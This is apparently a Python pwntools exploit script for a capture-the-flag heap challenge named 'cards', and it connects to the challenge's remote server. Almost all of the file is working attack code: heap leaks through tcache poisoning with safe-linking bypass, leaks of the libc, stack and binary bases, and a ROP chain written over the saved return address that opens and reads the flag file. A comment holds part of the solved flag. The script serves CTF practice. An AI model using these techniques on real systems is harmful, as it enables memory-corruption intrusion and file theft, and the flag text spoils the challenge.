from pwn import *
import os
from time import sleep
period=0.2
def new(size,color,name):
	p.sendline("1")
	p.recvuntil("Enter size of the name of the card:")
	p.send(str(size))
	p.recvuntil("Enter card color:")
	p.sendline(color)
	p.recvuntil("Enter name:")
	p.send(name)
	p.recvuntil("Choice:")


def delete(index):
	p.sendline("2")
	p.recvuntil("index of the card:")
	p.sendline(str(index))
	p.recvuntil("Choice:")


def edit(index,name):
	p.sendline("3")
	p.recvuntil("of the card:")
	p.sendline(str(index))
	p.recvuntil("Enter new name:")
	p.send(name)
	p.recvuntil("Choice:")

def leak_name(index):
	p.sendline("4")
	p.recvuntil("Enter the index of the card:")
	p.sendline(str(index))
	p.recvuntil("Card name:")
	data=p.recvline()
	p.recvuntil("Choice:")
	return data
def set_name(name):
	p.sendline("6")
	p.recvuntil("Enter your secret name:")
	p.sendline(name)

while True:
	#p=process("./cards",env={"LD_PRELOAD":"./libc-2.32.so"})
	p=remote("poseidonchalls.westeurope.cloudapp.azure.com",9004)
	p.recvuntil("Choice:")
	"""
	#5
	#6
	#free 0 
	# allocate 0x100*1
	#free 4
	#free 5
	#edit 4 fd to leak libc
	#7
	#8
	"""

	new(0x100-0x40+0x8,"BB","1"*50) #0
	new(0x100,"BB","2"*50) # 1
	new(0x100,"BB","3"*50) #deleted #2
	new(0x100,"BB","A"*16+"/home/challenge/flag\x00"+"4"*(0x100-0x20-21-16)+p64(0)+p64(0x21)) #deleted #3

	delete(3)
	new(0x100,"BB","A") #4
	half_leak=u64(leak_name(4).strip()[1:-1].ljust(8,"\x00"))
	heap=(half_leak<< 20) + 0x71000
	

	
	"""
	mps=open("/proc/"+str(p.pid)+"/maps").readlines()
	real_heap=int(mps[4][:12],16)
	print "FAKE:",hex(heap)
	print "REAL:",hex(real_heap)
	"""
	try:
		delete(4)
		delete(2)
		#edit(0,"A"*(16*12)+p64(heap>>12))
		edit(2,p64((heap >> 12) ^ (heap+0x2f0)))
		new(0x100,"CC","A"*8+"B"*8) #5
		new(0x100,"BB","M"*8+p64(0x431+0xd0))#6
		delete(0)
		new(0x100,"KK","L"*24)#7
		delete(7)
		new(0xf0,"KK","DONE")#8

		edit(8,p64(heap+0x511)+p64(0)*2)
		data="\x00"+leak_name(1).strip()[:-1]
		libc=u64(data.ljust(8,"\x00"))
		
		base=libc-0x3b6c00
		environ=base+0x3b95b8

		edit(8,p64(environ)+p64(0)*2)
		data=leak_name(1).strip()[:-1]
		stack=u64(data.ljust(8,"\x00"))

		edit(8,p64(stack-0x170)+p64(0)*2)
		data=leak_name(1).strip()[:-1]
		binaire=u64(data.ljust(8,"\x00"))
		bin_base=binaire-0x1247

		print "Stack:",hex(stack)
		print "base libc:",hex(base)
		print "bin_base:",hex(bin_base)
		saved_rip=stack-0x170

		#################
		pop_rdi=base+0x000000000002201c
		pop_rsi=base+0x000000000002c626
		pop_rdx=base+0x0000000000001b9e
		pop_rax=base+0x0000000000039718
		_open=base+0xe7200
		syscall=base+0x00000000000eba22
		_read=base+0x00000000000e7490
		puts=base+0x000000000006f3f0
		write=base+0x00000000000e7530
		exit=base+0x38ea0
		#################

		filepath=heap+0x720
		payload=""
		payload+=p64(pop_rax)
		payload+=p64(2)
		payload+=p64(pop_rdi)
		payload+=p64(filepath)
		payload+=p64(pop_rsi)
		payload+=p64(0)
		payload+=p64(syscall)

		payload+=p64(0xdeadbeef)
		payload+=p64(pop_rdi)
		payload+=p64(3)
		payload+=p64(pop_rsi)
		payload+=p64(filepath)
		payload+=p64(pop_rdx)
		payload+=p64(100)
		payload+=p64(_read)

		payload+=p64(bin_base+0x123b)

		edit(8,p64(saved_rip)+p64(0)*2)
		edit(1,payload)

		edit(8,p64(heap+0x720)+p64(0)*2)
		p.sendline("4")
		sleep(period)
		p.sendline("1")
		p.interactive()
	except:
		p.close()

#Poseidon{7CAch3_I$_5Ti1L_cuT3_@nD_what_about_fastb

"""
delete(2)
delete(3)
pause()
edit(3,"\x80\x69")
pause()
new(0x100,"BB","CCCCCCCCCCCC")
pause()
new(0x100,"DD",p64(0)+p64(0x501))

delete(0)
new(0x100-0x20,"EE","P"*0x40+"/home/challenge/flag\x00")

delete(6)
new(0x100,"BB","A"*8+"B"*8+"C"*8+"D"*8)
data=leak_name(7).strip()[32:-1].ljust(8,"\x00")

leak_heap=u64(data)-0x3f0
print "LEAK HEAP:",hex(leak_heap)
edit(7,"A"*32+p64(leak_heap+0x4c0))
data=leak_name(1).strip()[:-1].ljust(8,"\x00")

leak_libc=u64(data)
libc_base=leak_libc-0x3ebca0
environ=libc_base+0x00000000003ee098

print "LEAK LIBC:",hex(leak_libc)
print "BASE LIBC:",hex(libc_base)

edit(7,"A"*32+p64(environ))
data=leak_name(1).strip()[:-1].ljust(8,"\x00")
stack=u64(data)
print "LEAK STACK:",hex(stack)
edit(7,"A"*32+p64(stack-0x160))


#################
pop_rdi=libc_base+0x000000000002155f
pop_rsi=libc_base+0x0000000000023e8a
pop_rdx=libc_base+0x0000000000001b96
_open=libc_base+0x000000000010fd50
_read=libc_base+0x0000000000110180
puts=libc_base+0x0000000000080a30
#################
filepath=leak_heap+0x300


payload=""
payload+=p64(pop_rdi)
payload+=p64(filepath)
payload+=p64(pop_rsi)
payload+=p64(0)
payload+=p64(pop_rdi)
payload+=p64(0xdeadbeef)
edit(1,payload)

#new(0x100,"DD","A"*8)#7

#new("555555555")####################### 8
#pause()
"""
p.interactive()
